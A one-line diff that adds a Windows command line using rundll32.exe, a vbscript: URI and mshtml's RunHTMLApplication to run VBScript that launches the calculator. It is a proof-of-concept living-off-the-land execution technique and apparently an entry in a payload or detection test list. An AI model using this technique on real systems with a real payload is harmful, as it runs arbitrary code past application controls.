@@ -1,0 +1,1 @@
+rundll32.exe vbscript:"\..\mshtml.dll,RunHTMLApplication ";eval(Set objShell=WScript.CreateObject(\"WScript.Shell\")objShell.run(\"calc\"));
